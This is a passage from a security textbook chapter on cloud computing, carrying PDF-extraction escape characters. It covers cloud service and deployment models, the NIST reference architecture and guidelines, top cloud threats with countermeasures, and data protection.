and operating systems. IaaS offers the customer processing, storage, \\r\\nnetworks, and other fundamental computing resources so that the customer is able to \\r\\ndeploy and run arbitrary software, which can include operating systems and applica\\ufffetions. IaaS enables customers to combine basic computing services, such as number \\r\\ncrunching and data storage, to build highly adaptable computer systems.\\r\\nTypically, customers are able to self-provision this infrastructure, using a Web\\ufffebased graphical user interface that serves as an IT operations management console \\r\\nfor the overall environment. API access to the infrastructure may also be offered \\r\\nas an option. Examples of IaaS are Amazon Elastic Compute Cloud (Amazon \\r\\nEC2), Microsoft Windows Azure, Google Compute Engine (GCE), and Rackspace. \\r\\nFigure 13.2 compares the functions implemented by the cloud service provider for \\r\\nthe three service models.\\r\\nCloud Deployment Models\\r\\nThere is an increasingly prominent trend in many organizations to move a substantial \\r\\nportion or even all IT operations to enterprise cloud computing. The organization is \\r\\nfaced with a range of choices as to cloud ownership and management. In this subsec\\ufffetion, we look at the four most prominent deployment models for cloud computing.\\r\\nPUBLIC CLOUD A public cloud infrastructure is made available to the general pub\\ufffelic or a large industry group and is owned by an organization selling cloud services. \\r\\nFigure 13.2 Separation of Responsibilities in Cloud Service Models\\r\\nManaged by customer\\r\\nNetworking\\r\\nStorage\\r\\nServers\\r\\nVirtualization\\r\\nOS\\r\\nMiddleware\\r\\nRuntime\\r\\nData\\r\\nApplications\\r\\nTraditional\\r\\nIT-on\\r\\npremises\\r\\nNetworking\\r\\nStorage\\r\\nServers\\r\\nVirtualization\\r\\nOS\\r\\nMiddleware\\r\\nRuntime\\r\\nData\\r\\nApplications\\r\\nIaaS\\r\\nNetworking\\r\\nStorage\\r\\nServers\\r\\nVirtualization\\r\\nOS\\r\\nMiddleware\\r\\nRuntime\\r\\nData\\r\\nApplications\\r\\nPaaS\\r\\nNetworking\\r\\nStorage\\r\\nServers\\r\\nVirtualization\\r\\nOS\\r\\nMiddleware\\r\\nRuntime\\r\\nData\\r\\nApplications\\r\\nSaaS\\r\\nManaged by cloud service provider\\r\\nM13_STAL0611_04_GE_C13.indd 449 10/11/17 3:08 PM\\n\\n\\n450 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nThe cloud provider is responsible both for the cloud infrastructure and for the control \\r\\nof data and operations within the cloud. A public cloud may be owned, managed, and \\r\\noperated by a business, academic, government organization, or some combination of \\r\\nthem. It exists on the premises of the cloud service provider.\\r\\nIn a public cloud model, all major components are outside the enterprise fire\\ufffewall, located in a multitenant infrastructure. Applications and storage are made avail\\ufffeable over the Internet via secure IP, and can be free or offered at a pay-per-usage \\r\\nfee. This type of cloud supplies easy-to-use consumer-type services, such as Amazon \\r\\nand Google on-demand Web applications or capacity, Yahoo mail, and Facebook or \\r\\nLinkedIn social media providing free storage for photographs. While public clouds \\r\\nare inexpensive and scale to meet needs, they typically provide no or lower SLAs, \\r\\nand may not offer the guarantees against data loss or corruption found with private \\r\\nor hybrid cloud offerings. The public cloud is appropriate for CSCs and entities not \\r\\nrequiring the same levels of service that are expected within the firewall. In addition, \\r\\nthe public IaaS clouds do not necessarily provide for restrictions and compliance with \\r\\nprivacy laws, which remain the responsibility of the subscriber or corporate end user. \\r\\nIn many public clouds, the focus is on the CSC and small and medium-sized businesses \\r\\nwhere pay-per-use pricing is available, often equating to pennies per gigabyte. Exam\\ufffeples of services here might be photo and music sharing, laptop backup or file sharing.\\r\\nThe major advantage of the public cloud is cost. A subscribing organization only \\r\\npays for the services and resources it needs and can adjust these as needed. Further, \\r\\nthe subscriber has greatly reduced management overhead. The principal concern is \\r\\nsecurity. However, there are a number of public cloud providers that have demon\\ufffestrated strong security controls and, in fact, such providers may have more resources \\r\\nand expertise to devote to security that would be available in a private cloud.\\r\\nPRIVATE CLOUD A private cloud is implemented within the internal IT environ\\ufffement of the organization. The organization may choose to manage the cloud in house, \\r\\nor contract the management function to a third party. Additionally, the cloud servers \\r\\nand storage devices may exist on premise, off premise or both.\\r\\nPrivate clouds can deliver IaaS internally to employees or business units through \\r\\nan intranet or the Internet via a virtual private network (VPN), as well as software \\r\\n(applications) or storage as services to its branch offices. In both cases, private clouds \\r\\nare a way to leverage existing infrastructure, and deliver and chargeback for bundled \\r\\nor complete services from the privacy of the organization’s network. Examples of \\r\\nservices delivered through the private cloud include database on demand, e-mail on \\r\\ndemand, and storage on demand.\\r\\nA key motivation for opting for a private cloud is security. A private cloud \\r\\ninfrastructure offers tighter controls over the geographic location of data storage \\r\\nand other aspects of security. Other benefits include easy resource sharing and rapid \\r\\ndeployment to organizational entities.\\r\\nCOMMUNITY CLOUD A community cloud shares the characteristics of private and \\r\\npublic clouds. Like a private cloud, a community cloud has restricted access. Like a \\r\\npublic cloud, the cloud resources are shared among a number of independent organi\\ufffezations. The organizations that share the community cloud have similar requirements \\r\\nand, typically, a need to exchange data with each other. One example of an industry that \\r\\nis employing the community cloud concept is the health care industry. A community \\r\\nM13_STAL0611_04_GE_C13.indd 450 10/11/17 3:08 PM\\n\\n\\n13.1 / CLOUD COMPUTING 451\\r\\ncloud can be implemented to comply with government privacy and other regulations. \\r\\nThe community participants can exchange data in a controlled fashion.\\r\\nThe cloud infrastructure may be managed by the participating organizations \\r\\nor a third party and may exist on premise or off premise. In this deployment model, \\r\\nthe costs are spread over fewer users than a public cloud (but more than a private \\r\\ncloud), so only some of the cost savings potential of cloud computing are realized.\\r\\nHYBRID CLOUD The hybrid cloud infrastructure is a composition of two or more \\r\\nclouds (private, community, or public) that remain unique entities but are bound \\r\\ntogether by standardized or proprietary technology that enables data and application \\r\\nportability (e.g., cloud bursting for load balancing between clouds). With a hybrid \\r\\ncloud solution, sensitive information can be placed in a private area of the cloud, and \\r\\nless sensitive data can take advantage of the benefits of the public cloud.\\r\\nA hybrid public/private cloud solution can be particularly attractive for smaller \\r\\nbusinesses. Many applications for which security concerns are less can be offloaded \\r\\nat considerable cost savings without committing the organization to moving more \\r\\nsensitive data and applications to the public cloud. Table 13.1 lists some of the relative \\r\\nstrengths and weaknesses of the four cloud deployment models.\\r\\nCloud Computing Reference Architecture\\r\\nNIST SP 500–292 (NIST Cloud Computing Reference Architecture, September 2011) \\r\\nestablishes reference architecture, described as follows:\\r\\nPrivate Community Public Hybrid\\r\\nScalability Limited Limited Very high Very high\\r\\nSecurity Most secure option Very secure Moderately secure Very secure\\r\\nPerformance Very good Very good Low to medium Good\\r\\nReliability Very high Very high Medium Medium to high\\r\\nCost High Medium Low Medium\\r\\nTable 13.1 Comparison of Cloud Deployment Models\\r\\nThe NIST cloud computing reference architecture focuses on the requirements \\r\\nof “what” cloud services provide, not a “how to” design solution and implemen\\ufffetation. The reference architecture is intended to facilitate the understanding of \\r\\nthe operational intricacies in cloud computing. It does not represent the system \\r\\narchitecture of a specific cloud computing system; instead it is a tool for describing,\\r\\ndiscussing, and developing a system-specific architecture using a common frame\\ufffework of reference.\\r\\nNIST developed the reference architecture with the following objectives \\r\\nin mind:\\r\\n• To illustrate and understand the various cloud services in the context of an \\r\\noverall cloud computing conceptual model.\\r\\nM13_STAL0611_04_GE_C13.indd 451 10/11/17 3:08 PM\\n\\n\\n452 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\n• To provide a technical reference for CSCs to understand, discuss, categorize, \\r\\nand compare cloud services.\\r\\n• To facilitate the analysis of candidate standards for security, interoperability, \\r\\nand portability and reference implementations.\\r\\nThe reference architecture, depicted in Figure 13.3, defines five major actors in \\r\\nterms of the roles and responsibilities:\\r\\n• Cloud service consumer (CSC): A person or organization that maintains a \\r\\nbusiness relationship with, and uses service from, cloud providers.\\r\\n• Cloud service provider (CSP): A person, organization, or entity responsible for \\r\\nmaking a service available to interested parties.\\r\\n• Cloud auditor: A party that can conduct independent assessment of cloud ser\\ufffevices, information system operations, performance, and security of the cloud \\r\\nimplementation.\\r\\n• Cloud broker: An entity that manages the use, performance and delivery of \\r\\ncloud services, and negotiates relationships between CSPs and cloud consumers.\\r\\n• Cloud carrier: An intermediary that provides connectivity and transport of \\r\\ncloud services from CSPs to cloud consumers.\\r\\nThe roles of the cloud consumer and provider have already been discussed. To \\r\\nsummarize, a cloud service provider can provide one or more of the cloud services \\r\\nto meet IT and business requirements of cloud service consumers. For each of the \\r\\nthree service models (SaaS, PaaS, and IaaS), the CSP provides the storage and pro\\ufffecessing facilities needed to support that service model, together with a cloud interface \\r\\nfor cloud service consumers. For SaaS, the CSP deploys, configures, maintains, and \\r\\nupdates the operation of the software applications on a cloud infrastructure so that \\r\\nFigure 13.3 NIST Cloud Computing Reference Architecture\\r\\nCloud\\r\\nConsumer\\r\\nCloud\\r\\nAuditor\\r\\nService\\r\\nIntermediation\\r\\nService\\r\\nAggregation\\r\\nService\\r\\nArbitrage\\r\\nCloud\\r\\nBroker\\r\\nCloud Provider \\r\\nSecurity\\r\\nAudit\\r\\nPerformance\\r\\nAudit\\r\\nPrivacy\\r\\nImpact Audit\\r\\nSaaS\\r\\nService Layer\\r\\nService Orchestration Cloud\\r\\nService\\r\\nManagement\\r\\nPaaS\\r\\nHardware\\r\\nPhysical Resource Layer\\r\\nFacility\\r\\nResource Abstraction\\r\\nand Control Layer\\r\\nIaaS\\r\\nBusiness\\r\\nSupport\\r\\nProvisioning/\\r\\nConfiguration\\r\\nPortability/\\r\\nInteroperability\\r\\nSecurity\\r\\nPrivacy\\r\\nCloud Carrier\\r\\nM13_STAL0611_04_GE_C13.indd 452 10/11/17 3:08 PM\\n\\n\\n13.1 / CLOUD COMPUTING 453\\r\\nthe services are provisioned at the expected service levels to cloud consumers. The \\r\\nconsumers of SaaS can be organizations that provide their members with access to \\r\\nsoftware applications, end users who directly use software applications, or software \\r\\napplication administrators who configure applications for end users.\\r\\nFor PaaS, the CSP manages the computing infrastructure for the platform \\r\\nand runs the cloud software that provides the components of the platform, such as \\r\\nruntime software execution stack, databases, and other middleware components. \\r\\nCloud consumers of PaaS can employ the tools and execution resources provided \\r\\nby CSPs to develop, test, deploy, and manage the applications hosted in a cloud \\r\\nenvironment.\\r\\nFor IaaS, the CSP acquires the physical computing resources underlying the \\r\\nservice, including the servers, networks, storage, and hosting infrastructure. The IaaS \\r\\nCSC in turn uses these computing resources, such as a virtual computer, for their \\r\\nfundamental computing needs.\\r\\nThe cloud carrier is a networking facility that provides connectivity and trans\\ufffeport of cloud services between cloud consumers and CSPs. Typically, a CSP will set \\r\\nup service level agreements (SLAs) with a cloud carrier to provide services consistent \\r\\nwith the level of SLAs offered to cloud consumers, and may require the cloud carrier \\r\\nto provide dedicated and secure connections between cloud consumers and CSPs.\\r\\nA cloud broker is useful when cloud services are too complex for a cloud \\r\\nconsumer to easily manage. A cloud broker can offer three areas of support are as \\r\\nfollows:\\r\\n• Service intermediation: These are value-added services, such as identity \\r\\nmanagement, performance reporting, and enhanced security.\\r\\n• Service aggregation: The broker combines multiple cloud services to meet con\\ufffesumer needs not specifically addressed by a single CSP, or to optimize perfor\\ufffemance or minimize cost.\\r\\n• Service arbitrage: This is similar to service aggregation except that the services \\r\\nbeing aggregated are not fixed. Service arbitrage means a broker has the flexibil\\ufffeity to choose services from multiple agencies. The cloud broker, for example, can \\r\\nuse a credit-scoring service to measure and select an agency with the best score.\\r\\nA cloud auditor can evaluate the services provided by a CSP in terms of security \\r\\ncontrols, privacy impact, performance, and so on. The auditor is an independent entity \\r\\nthat can assure that the CSP conforms to a set of standards.\\r\\nFigure 13.4 illustrates the interactions between the actors. A cloud consumer \\r\\nmay request cloud services from a cloud provider directly or via a cloud broker. \\r\\nA cloud auditor conducts independent audits and may contact the others to collect \\r\\nnecessary information. This figure shows that cloud networking issues involve three \\r\\nseparate types of networks. For a cloud producer, the network architecture is that of \\r\\na typical large data center, which consists of racks of high-performance servers and \\r\\nstorage devices, interconnected with high-speed top-of-rack Ethernet switches. The \\r\\nconcerns in this context focus on VM placement and movement, load balancing, and \\r\\navailability issues. The enterprise network is likely to have a quite different architec\\ufffeture, typically including a number of LANs, servers, workstations, PCs, and mobile \\r\\ndevices, with a broad range of network performance, security, and management issues. \\r\\nM13_STAL0611_04_GE_C13.indd 453 10/11/17 3:08 PM\\n\\n\\n454 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nThe concern of both producer and consumer with respect to the cloud carrier, which \\r\\nis shared with many users, is the ability to create virtual networks with appropriate \\r\\nSLA and security guarantees.\\r\\n13.2 CLOUD SECURITY CONCEPTS\\r\\nThere are numerous aspects to cloud security and numerous approaches to providing \\r\\ncloud security measures. A good example of the scope of cloud security concerns and \\r\\nissues is seen in the NIST guidelines for cloud security, specified in NIST SP 800-144 \\r\\n(Guidelines on Security and Privacy in Public Cloud Computing, December 2011) \\r\\nand listed in Table 13.2. Thus, a full discussion of cloud security is well beyond the \\r\\nscope of this chapter.\\r\\nSecurity Issues for Cloud Computing\\r\\nSecurity is important to any computing infrastructure. Companies go to great lengths \\r\\nto secure on-premises computing systems, so it is not surprising that security looms as \\r\\na major consideration when augmenting or replacing on-premises systems with cloud \\r\\nservices. Allaying security concerns is frequently a prerequisite for further discussions \\r\\nabout migrating part or all of an organization’s computing architecture to the cloud. \\r\\nAvailability is another major concern.\\r\\nGenerally speaking, such questions only arise when businesses contemplat\\ufffeing moving core transaction processing, such as enterprise resource planning (ERP) \\r\\nsystems, and other mission critical applications to the cloud. Companies have tradi\\ufffetionally demonstrated less concern about migrating high maintenance applications \\r\\nsuch as e-mail and payroll to cloud service providers, even though such applications \\r\\nhold sensitive information.\\r\\nFigure 13.4 Interactions between Actors in Cloud Computing\\r\\nCloud Consumer\\r\\nCloud Broker\\r\\nCloud Auditor\\r\\nCloud Producer\\r\\nEnterprise\\r\\nNetwork\\r\\nCloud\\r\\nCarrier\\r\\nData Center\\r\\nNetwork\\r\\nM13_STAL0611_04_GE_C13.indd 454 10/11/17 3:08 PM\\n\\n\\n13.2 / CLOUD SECURITY CONCEPTS 455\\r\\nGovernance\\r\\nExtend organizational practices pertaining to the policies, procedures, and standards used for application \\r\\ndevelopment and service provisioning in the cloud, as well as the design, implementation, testing, use, and \\r\\nmonitoring of deployed or engaged services.\\r\\nPut in place audit mechanisms and tools to ensure organizational practices are followed throughout the system \\r\\nlifecycle.\\r\\nCompliance\\r\\nUnderstand the various types of laws and regulations that impose security and privacy obligations on the \\r\\norganization and potentially impact cloud computing initiatives, particularly those involving data location, \\r\\nprivacy and security controls, records management, and electronic discovery requirements.\\r\\nReview and assess the cloud provider’s offerings with respect to the organizational requirements to be met and \\r\\nensure that the contract terms adequately meet the requirements.\\r\\nEnsure that the cloud provider’s electronic discovery capabilities and processes do not compromise the privacy \\r\\nor security of data and applications.\\r\\nTrust\\r\\nEnsure that service arrangements have sufficient means to allow visibility into the security and privacy \\r\\ncontrols and processes employed by the cloud provider, and their performance over time.\\r\\nEstablish clear, exclusive ownership rights over data.\\r\\nInstitute a risk management program that is flexible enough to adapt to the constantly evolving and shifting \\r\\nrisk landscape for the lifecycle of the system.\\r\\nContinuously monitor the security state of the information system to support ongoing risk management \\r\\ndecisions.\\r\\nArchitecture\\r\\nUnderstand the underlying technologies that the cloud provider uses to provision services, including the impli\\ufffecations that the technical controls involved have on the security and privacy of the system, over the full system \\r\\nlifecycle and across all system components.\\r\\nIdentity and access management\\r\\nEnsure that adequate safeguards are in place to secure authentication, authorization, and other identity and \\r\\naccess management functions, and are suitable for the organization.\\r\\nSoftware isolation\\r\\nUnderstand virtualization and other logical isolation techniques that the cloud provider employs in its \\r\\nmulti-tenant software architecture, and assess the risks involved for the organization.\\r\\nData protection\\r\\nEvaluate the suitability of the cloud provider’s data management solutions for the organizational data \\r\\nconcerned and the ability to control access to data; to secure data while at rest, in transit, and in use; and to \\r\\nsanitize data.\\r\\nTake into consideration the risk of collating organizational data with those of other organizations whose threat \\r\\nprofiles are high or whose data collectively represent significant concentrated value.\\r\\nFully understand and weigh the risks involved in cryptographic key management with the facilities available in \\r\\nthe cloud environment and the processes established by the cloud provider.\\r\\nAvailability\\r\\nUnderstand the contract provisions and procedures for availability, data backup and recovery, and disaster \\r\\nrecovery, and ensure that they meet the organization’s continuity and contingency planning requirements.\\r\\nEnsure that during an intermediate or prolonged disruption or a serious disaster, critical operations can be \\r\\nimmediately resumed, and that all operations can be eventually reinstituted in a timely and organized manner.\\r\\nTable 13.2 NIST Guidelines on Cloud Security and Privacy Issues and Recommendations\\r\\n(Continued)\\r\\nM13_STAL0611_04_GE_C13.indd 455 10/11/17 3:08 PM\\n\\n\\n456 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nIncident response\\r\\nUnderstand the contract provisions and procedures for incident response and ensure that they meet the \\r\\nrequirements of the organization.\\r\\nEnsure that the cloud provider has a transparent response process in place and sufficient mechanisms to share \\r\\ninformation during and after an incident.\\r\\nEnsure that the organization can respond to incidents in a coordinated fashion with the cloud provider in \\r\\naccordance with their respective roles and responsibilities for the computing environment.\\r\\nTable 13.2 (Continued)\\r\\nAuditability is another concern for many organizations. For example, in the U.S., \\r\\nmany organizations must comply with Sarbanes-Oxley and/or Health and Human \\r\\nServices Health Insurance Portability and Accountability Act (HIPAA) regulations. \\r\\nThe auditability of their data must be ensured whether it is stored on premises or \\r\\nmoved to the cloud.\\r\\nBefore moving critical infrastructure to the cloud, businesses should perform due \\r\\ndiligence on security threats both from outside and inside the cloud. Many of the security \\r\\nissues associated with protecting clouds from outside threats are similar to those that \\r\\nhave traditionally faced centralized data centers. In the cloud, however, responsibility for \\r\\nassuring adequate security is frequently shared among users, vendors, and any third-party \\r\\nfirms that users rely on for security-sensitive software or configurations. Cloud users are \\r\\nresponsible for application-level security. Cloud vendors are responsible for physical \\r\\nsecurity and some software security such as enforcing external firewall policies. Security \\r\\nfor intermediate layers of the software stack is shared between users and vendors.\\r\\nA security risk that should not be overlooked by companies considering a \\r\\nmigration to the cloud is that posed by sharing vendor resources with other cloud \\r\\nusers. Cloud providers must guard against theft or denial-of-service attacks by their \\r\\nusers and users need to be protected from one another. Virtualization can be a pow\\ufffeerful mechanism for addressing these potential risks because it protects against most \\r\\nattempts by users to attack one another or the provider’s infrastructure. However, \\r\\nnot all resources are virtualized, and not all virtualization environments are bug free. \\r\\nIncorrect virtualization may allow user code to access to sensitive portions of the pro\\ufffevider’s infrastructure or the resources of other users. Once again, these security issues \\r\\nare not unique to the cloud and are similar to those involved in managing non-cloud \\r\\ndata centers, where different applications need to be protected from one another.\\r\\nAnother security concern that businesses should consider is the extent to which \\r\\nsubscribers are protected against the provider, especially in the area of inadvertent data \\r\\nloss. For example, in the event of provider infrastructure improvements, what happens to \\r\\nhardware that is retired or replaced? It is easy to imagine a hard disk being disposed of \\r\\nwithout being properly wiped clean of subscriber data. It is also easy to imagine permis\\ufffesions bugs or errors that make subscriber data visible to unauthorized users. User-level \\r\\nencryption may be an important self-help mechanism for subscribers, but businesses \\r\\nshould ensure that other protections are in place to avoid inadvertent data loss.\\r\\nAddressing Cloud Computing Security Concerns\\r\\nNumerous documents have been developed to guide business thinking about the \\r\\nsecurity issues associated with cloud computing. In addition to NIST SP 800-144, \\r\\nM13_STAL0611_04_GE_C13.indd 456 10/11/17 3:08 PM\\n\\n\\n13.3 / CLOUD SECURITY APPROACHES 457\\r\\nwhich provides overall guidance, there is also NIST SP 800-146 (Cloud Computing \\r\\nSynopsis and Recommendations, May 2012). NIST’s recommendations systematically \\r\\nconsider each of the major types of cloud services consumed by businesses, including \\r\\nSaaS, IaaS, and PaaS. While security issues vary somewhat depending on the type of \\r\\ncloud service, there are multiple NIST recommendations that are independent of ser\\ufffevice type. Not surprisingly, NIST recommends selecting cloud providers that support \\r\\nstrong encryption, have appropriate redundancy mechanisms in place, employ authen\\ufffetication mechanisms, and offer subscribers sufficient visibility about mechanisms used \\r\\nto protect subscribers from other subscribers and the provider. NIST SP 800-146 also \\r\\nlists the overall security controls that are relevant in a cloud computing environment \\r\\nand that must be assigned to the different cloud actors. These are listed in Table 13.3.\\r\\nAs more businesses incorporate cloud services into their enterprise network \\r\\ninfrastructures, cloud computing security will persist as an important issue. Examples \\r\\nof cloud computing security failures have the potential to have a chilling effect on \\r\\nbusiness interest in cloud services. This is inspiring service providers to be serious \\r\\nabout incorporating security mechanisms that will allay concerns of potential sub\\ufffescribers. Some service providers have moved their operations to Tier 4 data centers \\r\\n(see Section 5.8) to address user concerns about availability and redundancy. As so \\r\\nmany businesses remain reluctant to embrace cloud computing in a big way, cloud \\r\\nservice providers will have to continue to work hard to convince potential customers \\r\\nthat computing support for core business processes and mission critical applications \\r\\ncan be moved safely and securely to the cloud.\\r\\n13.3 CLOUD SECURITY APPROACHES\\r\\nRisks and Countermeasures\\r\\nIn general terms, security controls in cloud computing are similar to the security \\r\\ncontrols in any IT environment. However, because of the operational models and \\r\\ntechnologies used to enable cloud service, cloud computing may present risks that \\r\\nare specific to the cloud environment. The essential concept in this regard is that \\r\\nwhile the enterprise loses a substantial amount of control over resources, services, \\r\\nand applications, it must maintain accountability for security and privacy policies.\\r\\nTechnical Operational Management\\r\\nAccess Control\\r\\nAudit and Accountability\\r\\nIdentification and Authentication\\r\\nSystem and Communication \\r\\nProtection\\r\\nAwareness and Training\\r\\nConfiguration and Management\\r\\nContingency Planning\\r\\nIncident Response\\r\\nMaintenance\\r\\nMedia Protection\\r\\nPhysical and Environmental \\r\\nProtection\\r\\nPersonnel Security System and \\r\\nInformation Integrity\\r\\nCertification, Accreditation and \\r\\nSecurity Assessment\\r\\nPlanning Risk Assessment\\r\\nSystem and Services Acquisition\\r\\nTable 13.3 Control Functions and Classes\\r\\nM13_STAL0611_04_GE_C13.indd 457 10/11/17 3:08 PM\\n\\n\\n458 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nThe Cloud Security Alliance [CSA13] lists the following as the top cloud\\ufffespecific security threats:\\r\\n• Abuse and nefarious use of cloud computing: For many CSPs, it is relatively \\r\\neasy to register and begin using cloud services, some even offering free limited \\r\\ntrial periods. This enables attackers to get inside the cloud to conduct various \\r\\nattacks, such as spamming, malicious code attacks, and denial of service. PaaS \\r\\nproviders have traditionally suffered most from this kind of attacks; however, \\r\\nrecent evidence shows that hackers have begun to target IaaS vendors as well. \\r\\nThe burden is on the CSP to protect against such attacks, but cloud service \\r\\nclients must monitor activity with respect to their data and resources to detect \\r\\nany malicious behavior.\\r\\nCountermeasures include (1) stricter initial registration and validation \\r\\nprocesses; (2) enhanced credit card fraud monitoring and coordination; (3) com\\ufffeprehensive inspection of customer network traffic; and (4) monitoring public \\r\\nblacklists for one’s own network blocks.\\r\\n• Insecure interfaces and APIs: CSPs expose a set of software interfaces or APIs \\r\\nthat customers use to manage and interact with cloud services. The security and \\r\\navailability of general cloud services is dependent upon the security of these \\r\\nbasic APIs. From authentication and access control to encryption and activity \\r\\nmonitoring, these interfaces must be designed to protect against both accidental \\r\\nand malicious attempts to circumvent policy.\\r\\nCountermeasures include (1) analyzing the security model of CSP inter\\ufffefaces; (2) ensuring that strong authentication and access controls are imple\\ufffemented in concert with encrypted transmission; and (3) understanding the \\r\\ndependency chain associated with the API.\\r\\n• Malicious insiders: Under the cloud computing paradigm, an organization relin\\ufffequishes direct control over many aspects of security and, in doing so, confers \\r\\nan unprecedented level of trust onto the CSP. One grave concern is the risk of \\r\\nmalicious insider activity. Cloud architectures necessitate certain roles that are \\r\\nextremely high risk. Examples include CSP system administrators and managed \\r\\nsecurity service providers.\\r\\nCountermeasures include the following: (1) enforce strict supply chain \\r\\nmanagement and conduct a comprehensive supplier assessment; (2) specify \\r\\nhuman resource requirements as part of legal contract; (3) require transpar\\ufffeency into overall information security and management practices, as well as \\r\\ncompliance reporting; and (4) determine security breach notification processes.\\r\\n• Shared technology issues: IaaS vendors deliver their services in a scalable way \\r\\nby sharing infrastructure. Often, the underlying components that make up this \\r\\ninfrastructure (CPU caches, GPUs, etc.) were not designed to offer strong isola\\ufffetion properties for a multi-tenant architecture. CSPs typically approach this risk \\r\\nby using isolated VMs for individual clients. This approach is still vulnerable to \\r\\nattack, by both insiders and outsiders, and so can only be a part of an overall \\r\\nsecurity strategy.\\r\\nCountermeasures include the following: (1) implement security best prac\\ufffetices for installation/configuration; (2) monitor environment for unauthorized \\r\\nM13_STAL0611_04_GE_C13.indd 458 10/11/17 3:08 PM\\n\\n\\n13.3 / CLOUD SECURITY APPROACHES 459\\r\\nchanges/activity; (3) promote strong authentication and access control for \\r\\nadministrative access and operations; (4) enforce SLAs for patching and vul\\ufffenerability remediation; and (5) conduct vulnerability scanning and configura\\ufffetion audits.\\r\\n• Data loss or leakage: For many clients, the most devastating impact from a \\r\\nsecurity breach is the loss or leakage of data. We will address this issue in the \\r\\nnext section.\\r\\nCountermeasures include the following: (1) implement strong API access \\r\\ncontrol; (2) encrypt and protect integrity of data in transit and at rest; (3) ana\\ufffelyze data protection at both design and run time; and (4) implement strong key \\r\\ngeneration, storage and management, and destruction practices.\\r\\n• Account or service hijacking: Account and service hijacking, usually with stolen \\r\\ncredentials, remains a top threat. With stolen credentials, attackers can often \\r\\naccess critical areas of deployed cloud computing services, allowing them to \\r\\ncompromise the confidentiality, integrity, and availability of those services.\\r\\nCountermeasures include the following: (1) prohibit the sharing of account \\r\\ncredentials between users and services; (2) leverage strong two-factor authen\\ufffetication techniques where possible; (3) employ proactive monitoring to detect \\r\\nunauthorized activity; and (4) understand CSP security policies and SLAs.\\r\\n• Unknown risk profile: In using cloud infrastructures, the client necessarily cedes \\r\\ncontrol to the cloud provider on a number of issues that may affect security. \\r\\nThus the client must pay attention to and clearly define the roles and responsi\\ufffebilities involved for managing risks. For example, employees may deploy appli\\ufffecations and data resources at the CSP without observing the normal policies \\r\\nand procedures for privacy, security, and oversight.\\r\\nCountermeasures include (1) disclosure of applicable logs and data; (2) \\r\\npartial/full disclosure of infrastructure details (e.g., patch levels and firewalls); \\r\\nand (3) monitoring and alerting on necessary information.\\r\\nSimilar lists have been developed by the European Network and Information \\r\\nSecurity Agency [ENIS09] and NIST SP 800-144.\\r\\nData Protection in the Cloud\\r\\nThere are many ways to compromise data. Deletion or alteration of records without \\r\\na backup of the original content is an obvious example. Unlinking a record from a \\r\\nlarger context may render it unrecoverable, as can storage on unreliable media. Loss \\r\\nof an encoding key may result in effective destruction. Finally, unauthorized parties \\r\\nmust be prevented from gaining access to sensitive data.\\r\\nThe threat of data compromise increases in the cloud, due to the number of, \\r\\nand interactions between, risks and challenges that are either unique to the cloud \\r\\nor more dangerous because of the architectural or operational characteristics of the \\r\\ncloud environment.\\r\\nDatabase environments used in cloud computing can vary significantly. Some \\r\\nproviders support a multi-instance model, which provide a unique DBMS running on \\r\\na VM instance for each cloud subscriber. This gives the subscriber complete control \\r\\nover role definition, user authorization, and other administrative tasks related to \\r\\nM13_STAL0611_04_GE_C13.indd 459 10/11/17 3:08 PM\\n\\n\\n460 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nsecurity. Other providers support a multi-tenant model, which provides a predefined \\r\\nenvironment for the cloud subscriber that is shared with other tenants, typically \\r\\nthrough tagging data with a subscriber identifier. Tagging gives the appearance of \\r\\nexclusive use of the instance, but relies on the cloud provider to establish and main\\ufffetain a sound secure database environment.\\r\\nData must be secured while at rest, in transit, and in use, and access to the \\r\\ndata must be controlled. The client can employ encryption to protect data in transit, \\r\\nthough this involves key management responsibilities for the CSP. The client can \\r\\nenforce access control techniques, but, again, the CSP is involved to some extent \\r\\ndepending on the service model used.\\r\\nFor data at rest, the ideal security measure is for the client to encrypt the \\r\\ndatabase and only store encrypted data in the cloud, with the CSP having no access \\r\\nto the encryption key. So long as the key remains secure, the CSP has no ability to \\r\\ndecipher the data, although corruption and other denial-of-service attacks remain \\r\\na risk. The model depicted in Figure 5.9 works equally well when the data is stored \\r\\nin a cloud.\\r\\nSecurity Approaches for Cloud Computing Assets\\r\\nBeyond the protection and isolation of data, the cloud service provider (CSP) \\r\\nneeds to address the broader security considerations for the protection of its assets. \\r\\nFigure 13.5a, adapted from [ENIS15], suggests a categorization of these assets for \\r\\nthe three cloud service models. The bottom two layers shown in the figure include \\r\\norganization and facilities. Organization denotes the human resources and the poli\\ufffecies and procedures for maintaining the facilities and supporting the delivery of the \\r\\nservices. Facilities denote the physical structures and supplies such as networks, cool\\ufffeing, and power supply. Above these levels are the assets specific to the provision of \\r\\nservices. For IaaS, the CSP maintains a hypervisor and/or OS on each of its servers, as \\r\\nwell as the networking software for interconnection of CSP servers and connection \\r\\nto cloud service consumers (CSCs). Added to these assets for PaaS are the libraries, \\r\\nmiddleware, and other software to support CSC applications. For SaaS, the CSP also \\r\\nhas application software assets for CSC use.\\r\\nFigure 13.5b suggests key security tasks that are the responsibility of the CSP \\r\\nand of the CSC. The lowest level of the diagram has to do with organizational issues \\r\\nrelated to the management of its supplies and facilities. These issues will be dealt with \\r\\nin Chapters 14, 15, and 17. The next level of Figure 13.5b covers the physical security \\r\\nof the facility, a topic covered in Chapter 16. Above that, depending on the service \\r\\nmodel, the CSP is responsible for the security of a range of software capabilities; \\r\\nsecurity measures in the area were addressed in Chapters 11 and 12.\\r\\nCloud Security as a Service\\r\\nThe term security as a service has generally meant a package of security services \\r\\noffered by a service provider that offloads much of the security responsibility from \\r\\nan enterprise to the security service provider. Among the services typically provided \\r\\nare authentication, anti-virus, antimalware/spyware, intrusion detection, and security \\r\\nevent management. In the context of cloud computing, cloud security as a service, \\r\\ndesignated SecaaS, is a segment of the SaaS offering of a CSP.\\r\\nM13_STAL0611_04_GE_C13.indd 460 10/11/17 3:08 PM\\n\\n\\n13.3 / CLOUD SECURITY APPROACHES 461\\r\\nFigure 13.5 Security Considerations for Cloud Computing Assets\\r\\n(a) Cloud computing assets\\r\\nOrganization\\r\\nProvider Customer\\r\\nIaaS PaaS SaaS\\r\\nHypervisor/\\r\\nOS/Network\\r\\nMiddleware 